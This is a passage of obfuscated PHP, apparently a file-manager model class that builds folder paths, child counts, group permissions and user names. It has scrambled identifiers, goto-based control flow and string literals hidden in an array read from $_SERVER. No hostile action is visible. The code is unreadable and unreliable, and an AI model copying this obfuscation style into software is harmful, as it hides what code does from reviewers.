$CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[85]][$E¨¯ÿØÏ“ó[461]] = 1; $CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[85]][$E¨¯ÿØÏ“ó[462]] = $AêıŒÍÔî¢[$CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[396]]][$E¨¯ÿØÏ“ó[28]]; } if (isset($Eõ¬ê∆€ºÜ[$CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[396]]])) { $CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[85]][$E¨¯ÿØÏ“ó[463]] = array(); foreach ($Eõ¬ê∆€ºÜ[$CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[396]]] as $F≠âÛﬁê’ã) { $f⁄ÈÎﬁµ¶ = $FÁ‡°ÀôıÍ[$F≠âÛﬁê’ã]; $CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[85]][$E¨¯ÿØÏ“ó[463]][] = array($E¨¯ÿØÏ“ó[464] => $f⁄ÈÎﬁµ¶[$E¨¯ÿØÏ“ó[394]], $E¨¯ÿØÏ“ó[414] => $f⁄ÈÎﬁµ¶[$E¨¯ÿØÏ“ó[28]], $E¨¯ÿØÏ“ó[465] => $f⁄ÈÎﬁµ¶[$E¨¯ÿØÏ“ó[466]]); } } if (isset($E¡Ñö«ß•æ[$CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[396]]])) { $CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[85]][$E¨¯ÿØÏ“ó[467]] = array(); foreach ($E¡Ñö«ß•æ[$CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[396]]] as $fÌ…Ñµ£¥÷) { $CßíŸî÷Ç∂[$E¨¯ÿØÏ“ó[85]][$E¨¯ÿØÏ“ó[467]] = array($E¨¯ÿØÏ“ó[468] => $fÌ…Ñµ£¥÷[$E¨¯ÿØÏ“ó[469]], $E¨¯ÿØÏ“ó[470] => $fÌ…Ñµ£¥÷[$E¨¯ÿØÏ“ó[471]], $E¨¯ÿØÏ“ó[472] => $fÌ…Ñµ£¥÷[$E¨¯ÿØÏ“ó[396]], $E¨¯ÿØÏ“ó[473] => $fÌ…Ñµ£¥÷[$E¨¯ÿØÏ“ó[474]], $E¨¯ÿØÏ“ó[475] => $fÌ…Ñµ£¥÷[$E¨¯ÿØÏ“ó[476]], $E¨¯ÿØÏ“ó[477] => $fÌ…Ñµ£¥÷[$E¨¯ÿØÏ“ó[477]], $E¨¯ÿØÏ“ó[478] => $fÌ…Ñµ£¥÷[$E¨¯ÿØÏ“ó[478]]); } } } unset($CßíŸî÷Ç∂); goto Däæ∑õ∏°é; d˜ƒï‡»Á¬: $E¨¯ÿØÏ“ó =& $_SERVER[Öíæ€“”≠éÏË]; if (!defined($E¨¯ÿØÏ“ó[455])) { return; } $b§’…∂≥ä† = Model($E¨¯ÿØÏ“ó[456])->listData(); goto cãÏ¬÷“Ω; Dçä∏Ω∑û’: $FÁ‡°ÀôıÍ = array_to_keyvalue($b§’…∂≥ä†, $E¨¯ÿØÏ“ó[394]); $Eõ¬ê∆€ºÜ = array_to_keyvalue_group($CåÉØŸ◊É∂, $E¨¯ÿØÏ“ó[76], $E¨¯ÿØÏ“ó[420]); $AêıŒÍÔî¢ = array_to_keyvalue($aÇ¶ ‰äÿ∆, $E¨¯ÿØÏ“ó[76]); goto cÕ…©éº≥ÿ; f»¯êπÛã¿: } protected function _listAppendChildren(&$c◊ÚÆ±ô∞Ô, $eòœòÏÖ») { goto Fﬁ‘∫∆ã≈√; F√¡ü¢˜Ñ: foreach ($c◊ÚÆ±ô∞Ô as &$BŒ∂Ωäó…™) { if (!$BŒ∂Ωäó…™[$FËﬁ©å•ò¢[404]]) { continue; } $D¯°ÌÊöì§[] = $BŒ∂Ωäó…™[$FËﬁ©å•ò¢[396]]; } unset($BŒ∂Ωäó…™); if (!$D¯°ÌÊöì§) { return; } goto dù◊È∞ÜÕÓ; dïÒ∑‡‹Ç’: $B◊Ô§¥∏•ê = array(); foreach ($A√ÖÛÚ˜åó as $B∞Û•‰çﬁ≠) { $E€âïî˘Ÿé = $B∞Û•‰çﬁ≠[$FËﬁ©å•ò¢[479]]; $b¯€ØÍâû≥ = $B∞Û•‰çﬁ≠[$FËﬁ©å•ò¢[404]] == $FËﬁ©å•ò¢[87] ? $FËﬁ©å•ò¢[204] : $FËﬁ©å•ò¢[203]; if (!isset($B◊Ô§¥∏•ê[$E€âïî˘Ÿé])) { $B◊Ô§¥∏•ê[$E€âïî˘Ÿé] = array($FËﬁ©å•ò¢[203] => 0, $FËﬁ©å•ò¢[204] => 0); } $B◊Ô§¥∏•ê[$E€âïî˘Ÿé][$b¯€ØÍâû≥] += $B∞Û•‰çﬁ≠[$FËﬁ©å•ò¢[481]]; } foreach ($c◊ÚÆ±ô∞Ô as &$BŒ∂Ωäó…™) { if (!$BŒ∂Ωäó…™[$FËﬁ©å•ò¢[404]]) { continue; } $D≤Á√©ÁıÜ = is_array($B◊Ô§¥∏•ê[$BŒ∂Ωäó…™[$FËﬁ©å•ò¢[396]]]) ? $B◊Ô§¥∏•ê[$BŒ∂Ωäó…™[$FËﬁ©å•ò¢[396]]] : $F∑æ÷À˜´Ì; $BŒ∂Ωäó…™[$FËﬁ©å•ò¢[204]] = $D≤Á√©ÁıÜ[$FËﬁ©å•ò¢[204]]; $BŒ∂Ωäó…™[$FËﬁ©å•ò¢[203]] = $D≤Á√©ÁıÜ[$FËﬁ©å•ò¢[203]]; unset($BŒ∂Ωäó…™[$FËﬁ©å•ò¢[406]]); } goto C±ﬂ˜ÂπÀ‰; C±ﬂ˜ÂπÀ‰: unset($BŒ∂Ωäó…™); goto bÂêœÂéÉ ; Fﬁ‘∫∆ã≈√: $FËﬁ©å•ò¢ =& $_SERVER[Öíæ€“”≠éÏË]; $D¯°ÌÊöì§ = array(); $F∑æ÷À˜´Ì = array($FËﬁ©å•ò¢[203] => 0, $FËﬁ©å•ò¢[204] => 0); goto F√¡ü¢˜Ñ; dù◊È∞ÜÕÓ: $fô«ø¡ØÃ∆ = array($FËﬁ©å•ò¢[479] => array($FËﬁ©å•ò¢[7], $D¯°ÌÊöì§)); $bÇÍ¶ËÀ÷• = array($FËﬁ©å•ò¢[479], $FËﬁ©å•ò¢[404], $FËﬁ©å•ò¢[480] => $FËﬁ©å•ò¢[481]); $A√ÖÛÚ˜åó = $this->field($bÇÍ¶ËÀ÷•)->where($fô«ø¡ØÃ∆)->group($FËﬁ©å•ò¢[482])->select(); goto dïÒ∑‡‹Ç’; bÂêœÂéÉ : } protected function _listAppendAuth(&$c·’∂‹ùÃã) { goto B∑ªºŒ›·Ö; dÃƒË›ì‰Ç: foreach ($c·’∂‹ùÃã as $aÙ¨‡Öı¡) { if ($aÙ¨‡Öı¡[$EÖ√ì‘òŸá[405]] == self::TYPE_GROUP) { $fããªÉÜ…«[] = $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[396]]; } } if (!$fããªÉÜ…«) { return; } $eˆÀãªÇÓö = array_to_keyvalue($c·’∂‹ùÃã, $EÖ√ì‘òŸá[396]); goto eıÓ∑∆úàÜ; eıÓ∑∆úàÜ: $d´∫Ãı•Ωâ = Model($EÖ√ì‘òŸá[483])->getSourceList($fããªÉÜ…«, $eˆÀãªÇÓö); foreach ($c·’∂‹ùÃã as $cπ€´∏¿Õø => &$aÙ¨‡Öı¡) { $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[407]] = $d´∫Ãı•Ωâ[$aÙ¨‡Öı¡[$EÖ√ì‘òŸá[396]]]; if (!$aÙ¨‡Öı¡[$EÖ√ì‘òŸá[407]] && $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[405]] == self::TYPE_GROUP) { $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[407]] = Action($EÖ√ì‘òŸá[484])->pathGroupAuthMake($aÙ¨‡Öı¡[$EÖ√ì‘òŸá[485]]); if (!$aÙ¨‡Öı¡[$EÖ√ì‘òŸá[407]] && !_get($GLOBALS, $EÖ√ì‘òŸá[486])) { $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[196]] = !1; $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[195]] = !1; } } if ($aÙ¨‡Öı¡[$EÖ√ì‘òŸá[407]]) { $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[196]] = AuthModel::authCheckEdit($aÙ¨‡Öı¡[$EÖ√ì‘òŸá[407]][$EÖ√ì‘òŸá[408]]); $aÙ¨‡Öı¡[$EÖ√ì‘òŸá[195]] = AuthModel::authCheckView($aÙ¨‡Öı¡[$EÖ√ì‘òŸá[407]][$EÖ√ì‘òŸá[408]]); } $this->groupPathDisplay($aÙ¨‡Öı¡); } unset($aÙ¨‡Öı¡); goto AÑæÍ¥à©à; B∑ªºŒ›·Ö: $EÖ√ì‘òŸá =& $_SERVER[Öíæ€“”≠éÏË]; if (!defined($EÖ√ì‘òŸá[455])) { return; } $fããªÉÜ…« = array(); goto dÃƒË›ì‰Ç; AÑæÍ¥à©à: } public function _listAppendAuthSecret(&$Dóõ¥≥á‚‡) { goto b¯ˆ¬ùéçè; dÎùó∏¨ƒõ: $d¨Ó©œÜ’Ã = $this->_listAppendPath($e„ÚÚ ªÀ≥, !0); foreach ($Dóõ¥≥á‚‡ as $Eê”ƒñéÑÇ => &$bªÑíê€∞ù) { if (!is_array($bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]])) { continue; } if ($bªÑíê€∞ù[$FüÖº¯∏éﬂ[405]] != $FüÖº¯∏éﬂ[497]) { continue; } if (isset($CÍ‘™◊ıƒ‡[$bªÑíê€∞ù[$FüÖº¯∏éﬂ[396]]])) { goto f–ïñÖò¶; FÏÃ± ¯£›: if ($FËåø£ëç[$FüÖº¯∏éﬂ[433]] != $A‹úñ≤õÃ’) { $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[408]] = $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[408]] & $FËåø£ëç[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[407]]; } continue; goto Aáˆå≈∂î¶; Dã÷Ó¬∆â: $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[499]] = $FËåø£ëç; $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[500]] = $bªÑíê€∞ù[$FüÖº¯∏éﬂ[501]]; $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[502]] = $FüÖº¯∏éﬂ[87]; goto FÏÃ± ¯£›; f–ïñÖò¶: $FËåø£ëç = $CÍ‘™◊ıƒ‡[$bªÑíê€∞ù[$FüÖº¯∏éﬂ[396]]]; if (!is_array($bªÑíê€∞ù[$FüÖº¯∏éﬂ[446]])) { $bªÑíê€∞ù[$FüÖº¯∏éﬂ[446]] = array(); } $bªÑíê€∞ù[$FüÖº¯∏éﬂ[446]][$FüÖº¯∏éﬂ[498]] = $FËåø£ëç[$FüÖº¯∏éﬂ[492]]; goto Dã÷Ó¬∆â; Aáˆå≈∂î¶: } $BÁ…§Ì¯ˆÙ = $this->parentLevelArray($bªÑíê€∞ù[$FüÖº¯∏éﬂ[503]]); $aÀ·¬Ó∂¬® = array_reverse($BÁ…§Ì¯ˆÙ); foreach ($aÀ·¬Ó∂¬® as $BÂË£∞é®Ï => $A©¢⁄∏Í§Ñ) { goto A¬è¡∂§ÕÌ; aì…Ø∂íºÇ: for ($däÚû≤∞’° = 0; $däÚû≤∞’° < $f¨»Œå•√∆; $däÚû≤∞’°++) { if (!isset($d¨Ó©œÜ’Ã[$BÁ…§Ì¯ˆÙ[$däÚû≤∞’°]])) { $e™Ø≥Ôï¡√ = $FüÖº¯∏éﬂ[33]; break; } $e™Ø≥Ôï¡√ = $e™Ø≥Ôï¡√ . rtrim($d¨Ó©œÜ’Ã[$BÁ…§Ì¯ˆÙ[$däÚû≤∞’°]], $FüÖº¯∏éﬂ[8]) . $FüÖº¯∏éﬂ[8]; } $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[500]] = rtrim($e™Ø≥Ôï¡√, $FüÖº¯∏éﬂ[8]) . $FüÖº¯∏éﬂ[8]; break; goto d˜ƒÜ–•†Ü; A¬è¡∂§ÕÌ: if (!isset($CÍ‘™◊ıƒ‡[$A©¢⁄∏Í§Ñ])) { continue; } $FËåø£ëç = $CÍ‘™◊ıƒ‡[$A©¢⁄∏Í§Ñ]; $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[499]] = $FËåø£ëç; goto A›ÖÆïÊ¢∑; A›ÖÆïÊ¢∑: if ($FËåø£ëç[$FüÖº¯∏éﬂ[433]] != $A‹úñ≤õÃ’) { $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[408]] = $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[408]] & $FËåø£ëç[$FüÖº¯∏éﬂ[407]][$FüÖº¯∏éﬂ[407]]; } $e™Ø≥Ôï¡√ = $FüÖº¯∏éﬂ[33]; $f¨»Œå•√∆ = count($BÁ…§Ì¯ˆÙ) - $BÂË£∞é®Ï; goto aì…Ø∂íºÇ; d˜ƒÜ–•†Ü: } } unset($bªÑíê€∞ù); goto C∂â€íı‚É; Dè—·â≤íÓ: if (!$CÍ‘™◊ıƒ‡) { goto FÉ®∫¬Ê’Ÿ; D”∞èÖÁ„û: $CÍ‘™◊ıƒ‡ = array_to_keyvalue($CÍ‘™◊ıƒ‡, $FüÖº¯∏éﬂ[396]); $b„ëáøº±Ñ = json_decode(Model($FüÖº¯∏éﬂ[487])->get($FüÖº¯∏éﬂ[491]), !0); $b„ëáøº±Ñ = array_to_keyvalue($b„ëáøº±Ñ, $FüÖº¯∏éﬂ[394]); goto Bñºﬁœª¨√; Bñºﬁœª¨√: foreach ($CÍ‘™◊ıƒ‡ as $Eê”ƒñéÑÇ => $bªÑíê€∞ù) { goto C≠¢Üœ´éÃ; C≠¢Üœ´éÃ: $C©ß∑™ﬁÂå = $b„ëáøº±Ñ[$bªÑíê€∞ù[$FüÖº¯∏éﬂ[492]]]; if (!$C©ß∑™ﬁÂå) { $fÔáƒª„Îõ->remove($bªÑíê€∞ù[$FüÖº¯∏éﬂ[394]]); unset($CÍ‘™◊ıƒ‡[$Eê”ƒñéÑÇ]); continue; } $aÖˆıèÙè◊ = $a–Õ·£Ï£µ->listData($C©ß∑™ﬁÂå[$FüÖº¯∏éﬂ[407]]); goto Dç”ß¯Æö; dÃÔü©è‡Ö: $bªÑíê€∞ù[$FüÖº¯∏éﬂ[494]] = Model($FüÖº¯∏éﬂ[495])->getInfoSimpleOuter($bªÑíê€∞ù[$FüÖº¯∏éﬂ[433]]); $CÍ‘™◊ıƒ‡[$Eê”ƒñéÑÇ] = $bªÑíê€∞ù; goto CΩﬂ‚¡µ¿Æ; Dç”ß¯Æö: if (!$aÖˆıèÙè◊) { $fÔáƒª„Îõ->remove($bªÑíê€∞ù[$FüÖº¯∏éﬂ[394]]); unset($CÍ‘™◊ıƒ‡[$Eê”ƒñéÑÇ]); continue; } $bªÑíê€∞ù[$FüÖº¯∏éﬂ[407]] = $aÖˆıèÙè◊; $bªÑíê€∞ù[$FüÖº¯∏éﬂ[493]] = $C©ß∑™ﬁÂå; goto dÃÔü©è‡Ö; CΩﬂ‚¡µ¿Æ: } goto AûƒÿŸïá; FÉ®∫¬Ê’Ÿ: $a–Õ·£Ï£µ = Model($FüÖº¯∏éﬂ[489]); $fÔáƒª„Îõ = Model($FüÖº¯∏éﬂ[490]); $CÍ‘™◊ıƒ‡ = $fÔáƒª„Îõ->listData(); goto D”∞èÖÁ„û; AûƒÿŸïá: } $A‹úñ≤õÃ’ = defined($FüÖº¯∏éﬂ[496]) ? USER_ID : $FüÖº¯∏éﬂ[33]; $e„ÚÚ ªÀ≥ = array(); goto dÎùó∏¨ƒõ; b¯ˆ¬ùéçè: $FüÖº¯∏éﬂ =& $_SERVER[Öíæ€“”≠éÏË]; if (Model($FüÖº¯∏éﬂ[487])->get($FüÖº¯∏éﬂ[488]) != $FüÖº¯∏éﬂ[87]) { return; } static $CÍ‘™◊ıƒ‡ = false; goto Dè—·â≤íÓ; C∂â€íı‚É: } public function groupPathDisplay(&$B∂◊êøŸï´) { goto fŒ®ó“©üÎ; e´—®‰ß≈Ö: $B∂◊êøŸï´[$DæãùãÊ∏Ã[505]] = $Fèﬂ÷ìÓ®ñ[$DæãùãÊ∏Ã[479]]; $B∂◊êøŸï´[$DæãùãÊ∏Ã[506]] = $Fèﬂ÷ìÓ®ñ[$DæãùãÊ∏Ã[503]]; $B∂◊êøŸï´[$DæãùãÊ∏Ã[507]] = $Fèﬂ÷ìÓ®ñ[$DæãùãÊ∏Ã[508]]; goto CÑïö≈ÇÍ ; fŒ®ó“©üÎ: $DæãùãÊ∏Ã =& $_SERVER[Öíæ€“”≠éÏË]; if ($B∂◊êøŸï´[$DæãùãÊ∏Ã[405]] != self::TYPE_GROUP) { return; } $Fèﬂ÷ìÓ®ñ = Model($DæãùãÊ∏Ã[504])->getInfo($B∂◊êøŸï´[$DæãùãÊ∏Ã[485]]); goto fÕ≥õããéÖ; fÕ≥õããéÖ: $aéï∫¨Ûµ‹ = $this->parentLevelArray($Fèﬂ÷ìÓ®ñ[$DæãùãÊ∏Ã[503]]); $AáŒ…óﬂ¬ = $DæãùãÊ∏Ã[33]; foreach ($aéï∫¨Ûµ‹ as $dÛÚå ¡ﬁö) { $Eã…∫€¶ÊΩ = Model($DæãùãÊ∏Ã[504])->getInfo($dÛÚå ¡ﬁö); $AáŒ…óﬂ¬ .= $Eã…∫€¶ÊΩ[$DæãùãÊ∏Ã[85]][$DæãùãÊ∏Ã[396]] . $DæãùãÊ∏Ã[47]; } goto e´—®‰ß≈Ö; CÑïö≈ÇÍ : $B∂◊êøŸï´[$DæãùãÊ∏Ã[509]] = $AáŒ…óﬂ¬ . $Fèﬂ÷ìÓ®ñ[$DæãùãÊ∏Ã[85]][$DæãùãÊ∏Ã[396]]; goto C‚“∏¬Ãè; C‚“∏¬Ãè: } protected function _listAppendPath(&$B˜â∫•ﬁÓá, $eÂ◊äö…˜´ = false) { goto F¿ü‰çÏõ™; B–≤óˆ¢Ò¬: $c¬ÈÀïß˜Ø = array(); if ($eÂ◊äö…˜´) { return $Eèíıˆ⁄ßò; } foreach ($B˜â∫•ﬁÓá as &$DËë»°•Â⁄) { goto BÂÑÉ±Ãã‘; bó§ÀåÀµá: if (isset($c¬ÈÀïß˜Ø[$DËë»°•Â⁄[$DÙ»∏›√”◊[503]]])) { continue; } $c¬ÈÀïß˜Ø[$DËë»°•Â⁄[$DÙ»∏›√”◊[503]]] = !0; $EîÙ¡Ñ™Ì‡ = $this->parentLevelArray($DËë»°•Â⁄[$DÙ»∏›√”◊[503]]); goto f©øïæ∑‰€; BÂÑÉ±Ãã‘: $D∆á≤µå§≈ = $DËë»°•Â⁄[$DÙ»∏›√”◊[396]]; if ($DËë»°•Â⁄[$DÙ»∏›√”◊[404]] == $DÙ»∏›√”◊[87] && $DËë»°•Â⁄[$DÙ»∏›√”◊[479]] != 0) { $Eèíıˆ⁄ßò[$D∆á≤µå§≈] = $DËë»°•Â⁄[$DÙ»∏›√”◊[28]]; } if ($DËë»°•Â⁄[$DÙ»∏›√”◊[404]] == $DÙ»∏›√”◊[87] && $DËë»°•Â⁄[$DÙ»∏›√”◊[479]] == 0 && !isset($Eèíıˆ⁄ßò[$D∆á≤µå§≈])) { $Eèíıˆ⁄ßò[$D∆á≤µå§≈] = $this->_listAppendPathRoot($DËë»°•Â⁄, array()); } goto bó§ÀåÀµá; f©øïæ∑‰€: foreach ($EîÙ¡Ñ™Ì‡ as $BÙÁŸç›º’ => $aü∆¯Ëó«å) { if (isset($Eèíıˆ⁄ßò[$aü∆¯Ëó«å])) { continue; } if ($BÙÁŸç›º’ == 0) { $Eèíıˆ⁄ßò[$aü∆¯Ëó«å] = $this->_listAppendPathRoot($DËë»°•Â⁄, $EîÙ¡Ñ™Ì‡); } if ($BÙÁŸç›º’ != 0) { $d…‚∑á¨öÑ[] = $aü∆¯Ëó«å; } } goto DÀÛÖ‹ ¯º; DÀÛÖ‹ ¯º: } goto cäÉ÷õ¶æü; F¿ü‰çÏõ™: $DÙ»∏›√”◊ =& $_SERVER[Öíæ€“”≠éÏË]; static $Eèíıˆ⁄ßò = array(); $d…‚∑á¨öÑ = array(); goto B–≤óˆ¢Ò¬; CÉ¡äççÈ’: unset($DËë»°•Â⁄); return $B˜â∫•ﬁÓá; goto AÇ‰ÆÛ€‚µ; cäÉ÷õ¶æü: unset($DËë»°•Â⁄); $d…‚∑á¨öÑ = array_unique($d…‚∑á¨öÑ); if (count($d…‚∑á¨öÑ) > 0) { $BÒ»˘À≠Ú = array($DÙ»∏›√”◊[411] => array($DÙ»∏›√”◊[412], $d…‚∑á¨öÑ)); if (count($d…‚∑á¨öÑ) == 1) { $f£ﬁâ±ì„ª = $this->sourceInfo($d…‚∑á¨öÑ[0]); $fçÛÕÖ§‚¬ = is_array($f£ﬁâ±ì„ª) ? array($f£ﬁâ±ì„ª) : !1; } else { $fçÛÕÖ§‚¬ = $this->field($DÙ»∏›√”◊[510])->where($BÒ»˘À≠Ú)->select(); } if (!$fçÛÕÖ§‚¬) { $fçÛÕÖ§‚¬ = array(); } foreach ($fçÛÕÖ§‚¬ as $aàü©ıë±ê) { $Eèíıˆ⁄ßò[$aàü©ıë±ê[$DÙ»∏›√”◊[396]]] = $aàü©ıë±ê[$DÙ»∏›√”◊[28]]; } } goto CëÉ›äÇ˜; CëÉ›äÇ˜: $fﬁÚÎ∑ÛèŸ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $D‰ÇîÎç› = array(); foreach ($B˜â∫•ﬁÓá as &$DËë»°•Â⁄) { goto B…Ü∑ÕÚŒû; B…Ü∑ÕÚŒû: $fØéﬁ©õãé = $DËë»°•Â⁄[$DÙ»∏›√”◊[503]]; $bÛî‘ùñöÍ = $DÙ»∏›√”◊[33]; if (isset($D‰ÇîÎç›[$fØéﬁ©õãé])) { $bÛî‘ùñöÍ = $D‰ÇîÎç›[$fØéﬁ©õãé]; } else { $EîÙ¡Ñ™Ì‡ = $this->parentLevelArray($DËë»°•Â⁄[$DÙ»∏›√”◊[503]]); foreach ($EîÙ¡Ñ™Ì‡ as $BÙÁŸç›º’ => $aü∆¯Ëó«å) { if (isset($Eèíıˆ⁄ßò[$aü∆¯Ëó«å])) { $bÛî‘ùñöÍ .= $Eèíıˆ⁄ßò[$aü∆¯Ëó«å] . $DÙ»∏›√”◊[8]; } } $D‰ÇîÎç›[$fØéﬁ©õãé] = $bÛî‘ùñöÍ; } goto cŸΩ“‰œó™; cŸΩ“‰œó™: $bÛî‘ùñöÍ .= $DËë»°•Â⁄[$DÙ»∏›√”◊[28]]; if ($DËë»°•Â⁄[$DÙ»∏›√”◊[404]] == $DÙ»∏›√”◊[87]) { $bÛî‘ùñöÍ .= $DÙ»∏›√”◊[8]; } $DËë»°•Â⁄[$DÙ»∏›√”◊[501]] = str_replace($DÙ»∏›√”◊[511], $DÙ»∏›√”◊[8], $bÛî‘ùñöÍ); goto E≥¡ñû àë; E≥¡ñû àë: if ($DËë»°•Â⁄[$DÙ»∏›√”◊[479]] == $DÙ»∏›√”◊[191]) { $DËë»°•Â⁄[$DÙ»∏›√”◊[28]] = trim($Eèíıˆ⁄ßò[$DËë»°•Â⁄[$DÙ»∏›√”◊[396]]], $DÙ»∏›√”◊[8]); } if (intval($DËë»°•Â⁄[$DÙ»∏›√”◊[405]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($DËë»°•Â⁄, $EîÙ¡Ñ™Ì‡, $fﬁÚÎ∑ÛèŸ); } goto dŒ»‰µ≤¡Ü; dŒ»‰µ≤¡Ü: } goto CÉ¡äççÈ’; AÇ‰ÆÛ€‚µ: } private function _listAppendPathRecycle(&$cÉ≤’¯øàﬂ, $Fﬁ∫…£•ÏÚ, $F€ìÇ¨êÜû) { goto aÒ´‹Èõœà; e€”Óäıªﬂ: $A¶ﬁûì«±ï = implode($aﬁŸÈ·ÕúÖ[8], array_slice($EÈ…‡·ﬂ«©, 2)); $cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[501]] = $aﬁŸÈ·ÕúÖ[8] . LNG($aﬁŸÈ·ÕúÖ[512]) . $aﬁŸÈ·ÕúÖ[8] . ltrim($A¶ﬁûì«±ï, $aﬁŸÈ·ÕúÖ[8]); $cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[503]] = $aﬁŸÈ·ÕúÖ[513] . implode($aﬁŸÈ·ÕúÖ[47], array_slice($Fﬁ∫…£•ÏÚ, 1)) . $aﬁŸÈ·ÕúÖ[47]; goto BÙΩì⁄¶ñÎ; BÙΩì⁄¶ñÎ: if ($cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[396]] == $F€ìÇ¨êÜû) { $cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[503]] = $aﬁŸÈ·ÕúÖ[513]; $cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[479]] = $aﬁŸÈ·ÕúÖ[191]; $cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[28]] = LNG($aﬁŸÈ·ÕúÖ[512]); } $cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[514]] = $aﬁŸÈ·ÕúÖ[515]; goto A∫≤“ﬂ≤™ã; aÒ´‹Èõœà: $aﬁŸÈ·ÕúÖ =& $_SERVER[Öíæ€“”≠éÏË]; if (!in_array($F€ìÇ¨êÜû, $Fﬁ∫…£•ÏÚ) && $cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[396]] != $F€ìÇ¨êÜû) { return; } $EÈ…‡·ﬂ«© = explode($aﬁŸÈ·ÕúÖ[8], trim($cÉ≤’¯øàﬂ[$aﬁŸÈ·ÕúÖ[501]], $aﬁŸÈ·ÕúÖ[8])); goto e€”Óäıªﬂ; A∫≤“ﬂ≤™ã: } protected function _listAppendPathRoot(&$dﬁÃ≥»¨„Í, $b†æÂ‡Ú‚ü) { $Bó€ﬂ¯÷áå =& $_SERVER[Öíæ€“”≠éÏË]; $b⁄ò∫ Ó§Ÿ = $Bó€ﬂ¯÷áå[33]; if ($dﬁÃ≥»¨„Í[$Bó€ﬂ¯÷áå[405]] == self::TYPE_USER) { if (defined($Bó€ﬂ¯÷áå[455]) && $dﬁÃ≥»¨„Í[$Bó€ﬂ¯÷áå[485]] == USER_ID) { $b⁄ò∫ Ó§Ÿ = LNG($Bó€ﬂ¯÷áå[516]); if (!$b†æÂ‡Ú‚ü) { $dﬁÃ≥»¨„Í[$Bó€ﬂ¯÷áå[28]] = $b⁄ò∫ Ó§Ÿ; } } else { $BÖ‰·¢é„Ÿ = Model($Bó€ﬂ¯÷áå[495])->getInfoSimple($dﬁÃ≥»¨„Í[$Bó€ﬂ¯÷áå[485]]); $b⁄ò∫ Ó§Ÿ = LNG($Bó€ﬂ¯÷áå[517]) . $Bó€ﬂ¯÷áå[160] . $BÖ‰·¢é„Ÿ[$Bó€ﬂ¯÷áå[28]] . $Bó€ﬂ¯÷áå[518]; } } else { if ($dﬁÃ≥»¨„Í[$Bó€ﬂ¯÷áå[405]] == self::TYPE_GROUP) { $BÖ‰·¢é„Ÿ = Model($Bó€ﬂ¯÷áå[504])->getInfoSimple($dﬁÃ≥»¨„Í[$Bó€ﬂ¯÷áå[485]]); $b⁄ò∫ Ó§Ÿ = $BÖ‰·¢é„Ÿ[$Bó€ﬂ¯÷áå[28]]; } else { if ($dﬁÃ≥»¨„Í[$Bó€ﬂ¯÷áå[405]] == self::TYPE_SYSTEM) { $b⁄ò∫ Ó§Ÿ = $Bó€ﬂ¯÷áå[519]; } } } $b⁄ò∫ Ó§Ÿ = $b⁄ò∫ Ó§Ÿ ? $Bó€ﬂ¯÷áå[8] . $b⁄ò∫ Ó§Ÿ . $Bó€ﬂ¯÷áå[8] : $Bó€ﬂ¯÷áå[8]; return $b⁄ò∫ Ó§Ÿ; } protected function _listAppendUser(&$f◊“¬éä¿ì) { goto D±ÃÍã»µˆ; A©Ò§ÇúáΩ: $BùÚ¯É–€© = array_merge($Bòô≥æ◊‹ã, $C∑ÜÊ‰ÔŒ¿); $f…»„ÁŒ§ﬂ = Model($b≤ı”¢≤à⁄[520])->userListInfo($BùÚ¯É–€©); foreach ($f◊“¬éä¿ì as &$cÈß–ØÇﬁ⁄) { $DÛ–ó‹‘Ç± = $cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[433]]; $cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[433]] = $f…»„ÁŒ§ﬂ[$DÛ–ó‹‘Ç±] ? $f…»„ÁŒ§ﬂ[$DÛ–ó‹‘Ç±] : !1; $DÛ–ó‹‘Ç± = $cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[435]]; $cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[435]] = $f…»„ÁŒ§ﬂ[$DÛ–ó‹‘Ç±] ? $f…»„ÁŒ§ﬂ[$DÛ–ó‹‘Ç±] : !1; if (isset($cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[446]]) && $cÈß–ØÇﬁ⁄[$b≤ı”¢≤à⁄[446]][$b≤ı”¢≤à⁄[521]]) { $dÑ†„ﬁ‹´¶ = 